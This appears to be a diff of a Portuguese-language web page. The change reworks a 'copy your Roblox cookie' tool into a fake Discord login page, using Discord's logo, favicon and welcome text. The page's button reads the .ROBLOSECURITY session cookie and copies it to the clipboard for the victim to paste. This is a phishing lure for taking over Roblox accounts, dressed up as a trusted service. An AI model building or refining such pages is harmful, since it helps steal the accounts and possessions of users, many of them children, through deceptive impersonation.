@@ -3,77 +3,109 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Copiar Cookie Roblox</title>
+  <title>Discord - Login</title>
+  <link rel="icon" href="https://discord.com/assets/f9bb9c4af2b9c32a2c5ee0014661546d.png" type="image/png">
   <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      font-family: Arial, Helvetica, sans-serif;
-      background: #0d1117;
-      color: #e6edf3;
-      margin: 0;
-      padding: 30px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: #36393f;
+      color: #dcddde;
       min-height: 100vh;
-    }
-    h1 {
-      color: #58a6ff;
-      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
     }
     .container {
-      background: #161b22;
-      padding: 30px;
-      border-radius: 12px;
-      border: 1px solid #30363d;
+      background: #36393f;
       width: 100%;
-      max-width: 500px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+      max-width: 480px;
+      padding: 40px 32px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.4);
+      text-align: center;
     }
-    button {
-      background: #238636;
+    .logo {
+      width: 120px;
+      margin: 0 auto 30px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      color: #fff;
+    }
+    p.subtitle {
+      font-size: 16px;
+      color: #b9bbbe;
+      margin-bottom: 40px;
+      line-height: 1.4;
+    }
+    .btn {
+      background: #5865f2;
       color: white;
       border: none;
       padding: 14px 24px;
-      font-size: 18px;
-      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 500;
+      border-radius: 4px;
       cursor: pointer;
-      margin: 20px 0;
       width: 100%;
+      margin: 16px 0;
       transition: background 0.2s;
     }
-    button:hover {
-      background: #2ea043;
+    .btn:hover {
+      background: #4752c4;
     }
-    textarea {
-      width: 100%;
-      min-height: 120px;
-      background: #0d1117;
-      color: #c9d1d9;
-      border: 1px solid #30363d;
-      border-radius: 6px;
-      padding: 12px;
-      font-family: monospace;
-      resize: vertical;
-      margin-top: 10px;
+    .btn-copy {
+      background: #43b581;
+    }
+    .btn-copy:hover {
+      background: #3da162;
     }
     #status {
-      margin-top: 15px;
-      font-size: 15px;
-      color: #f85149;
+      margin-top: 16px;
+      font-size: 14px;
+      color: #43b581;
     }
-    .success { color: #3fb950 !important; }
+    .error { color: #f04747 !important; }
+    .art {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 40%;
+      background: linear-gradient(to top, rgba(54,57,63,0.8), transparent);
+      pointer-events: none;
+      z-index: -1;
+    }
+    @media (max-width: 500px) {
+      .container { padding: 30px 20px; border-radius: 0; min-height: 100vh; }
+    }
   </style>
 </head>
 <body>
 
+  <div class="art"></div>
+
   <div class="container">
-    <h1>Copiar seu cookie do Roblox</h1>
-    
-    <button onclick="copiarCookie()">Copiar seu cookie do Roblox</button>
-    
-    <textarea id="resultado" readonly placeholder="O cookie vai aparecer aqui (ou será copiado automaticamente para a área de transferência)"></textarea>
-    
+    <img class="logo" src="https://discord.com/assets/2c21aeda16de354ba9334551a883b481.png" alt="Discord Logo">
+
+    <h1>Bem-vindo de volta!</h1>
+    <p class="subtitle">Estamos felizes em te ver novamente. Faça login para continuar.</p>
+
+    <!-- Seu botão principal aqui, estilizado como botão do Discord -->
+    <button class="btn btn-copy" onclick="copiarCookie()">Copiar seu cookie do Roblox</button>
+
     <div id="status"></div>
+
+    <textarea id="resultado" readonly placeholder="O cookie aparecerá aqui (ou será copiado pro clipboard)" style="width:100%; height:100px; margin-top:20px; background:#2f3136; color:#dcddde; border:1px solid #202225; border-radius:4px; padding:12px; font-family:monospace; resize:none; display:none;"></textarea>
+
+    <p style="margin-top:32px; font-size:14px; color:#72767d;">
+      Precisa de ajuda? <a href="#" style="color:#00aff4; text-decoration:none;">Suporte</a> • 
+      <a href="#" style="color:#00aff4; text-decoration:none;">Registrar</a>
+    </p>
   </div>
 
   <script>
@@ -83,44 +115,43 @@
       
       status.textContent = "";
       status.className = "";
+      textarea.style.display = "none";
       textarea.value = "";
 
       try {
-        // Pega todos os cookies
         const cookies = document.cookie.split('; ');
-        let cookieRoblox = null;
+        let robloxCookie = null;
         
-        for (let cookie of cookies) {
-          if (cookie.startsWith(".ROBLOSECURITY=")) {
-            cookieRoblox = cookie.split('=')[1];
+        for (let c of cookies) {
+          if (c.trim().startsWith(".ROBLOSECURITY=")) {
+            robloxCookie = c.split('=')[1];
             break;
           }
         }
 
-        if (!cookieRoblox) {
-          status.textContent = "Cookie .ROBLOSECURITY não encontrado. Você está logado no Roblox nesta aba?";
-          status.className = "";
-          textarea.value = "Não encontrado :(";
+        if (!robloxCookie) {
+          status.textContent = "Cookie .ROBLOSECURITY não encontrado. Logue no Roblox primeiro!";
+          status.className = "error";
           return;
         }
 
-        // Tenta copiar para clipboard
-        navigator.clipboard.writeText(cookieRoblox)
+        navigator.clipboard.writeText(robloxCookie)
           .then(() => {
-            status.textContent = "Cookie copiado com sucesso! (Ctrl+V para colar)";
-            status.className = "success";
-            textarea.value = cookieRoblox;
-          })
-          .catch(err => {
-            // Se falhar (ex: permissão bloqueada), mostra na caixa
-            status.textContent = "Não consegui copiar automaticamente. Copie manualmente →";
+            status.textContent = "Cookie copiado! (cole com Ctrl+V)";
             status.className = "";
-            textarea.value = cookieRoblox;
+            textarea.value = robloxCookie;
+            textarea.style.display = "block";
+          })
+          .catch(() => {
+            status.textContent = "Cópia automática falhou. Copie manualmente abaixo:";
+            status.className = "error";
+            textarea.value = robloxCookie;
+            textarea.style.display = "block";
           });
 
       } catch (e) {
-        status.textContent = "Erro inesperado: " + e.message;
-        textarea.value = "Erro ao tentar ler os cookies";
+        status.textContent = "Erro: " + e.message;
+        status.className = "error";
       }
     }
   </script>
